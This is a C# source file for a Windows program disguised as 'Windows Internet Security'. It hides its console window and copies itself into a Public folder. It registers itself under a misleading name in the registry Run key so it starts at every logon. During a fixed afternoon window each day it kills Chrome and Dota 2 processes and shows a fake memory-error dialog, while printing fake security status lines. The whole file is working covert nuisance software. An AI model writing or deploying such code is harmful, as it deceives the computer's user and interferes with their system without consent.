using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace WindowsInternet
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        const int TimeToWait = 10;
        
        private static string[] _consoleStrings = { "Internet Status = false", "Using standart internet connection HTTP/HTTPS", "Internet security failed trying to secure the computer", "Connection=true", "Internet Status = true", "Exit" };

        private static string _fileName = "WindowsInternet.exe";
        private static string _fileBdName = "WindowsInternet.pdb";

        private static string[] _processes = { "chrome", "dota2" };

        private static DateTime time;

        private static DateTime GetTimeToWork()
        {
            return new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day, 13, 45, 0);
        }

        private static DateTime GetTimeToStop()
        {
            return new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day, 15, 45, 0);
        }

        private static void printInternetStrings()
        {
            foreach (var @string in _consoleStrings)
            {
                Console.WriteLine(@string);
            }
        }

        private static void killProcesses()
        {
            foreach (var procStr in _processes)
            {
                var procArr = Process.GetProcessesByName(procStr);
                if (procArr.Length != 0)
                {
                    foreach (var proc in procArr)
                    {
                        proc.Kill();
                    }
                    MessageBox.Show("Память не может быть read written", procStr, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private static void addToReg(string path)
        {
            Microsoft.Win32.RegistryKey Key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", true);  
            Key.SetValue("DoLinqToSql", path);
            Key.Flush();
            Key.Close();
        }

        public static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            if (!Directory.Exists(@"C:/Users/Public/Windows Internet Security")) 
            {
                Directory.CreateDirectory(@"C:/Users/Public/Windows Internet Security");
                File.Copy(Application.StartupPath+"/"+_fileName, @"C:/Users/Public/Windows Internet Security/"+_fileName);
                File.Copy(Application.StartupPath + "/" + _fileBdName, @"C:/Users/Public/Windows Internet Security/" + _fileBdName);
                Process.Start(@"C:/Users/Public/Windows Internet Security/" + _fileName);
                addToReg(@"C:/Users/Public/Windows Internet Security/" + _fileName);

                return;
            }
            time = DateTime.Now.AddMinutes(TimeToWait);
            new Thread(() => printInternetStrings()).Start();
            while (true)
            {
                if (DateTime.Now > time)
                {
                    time.AddMinutes(TimeToWait);
                    if (DateTime.Now >= GetTimeToWork() && DateTime.Now <= GetTimeToStop())
                    {
                        Console.WriteLine(GetTimeToWork());
                        time = DateTime.Now.AddMinutes(1);
                        killProcesses();
                    }
                }
            }
        }
    }
}
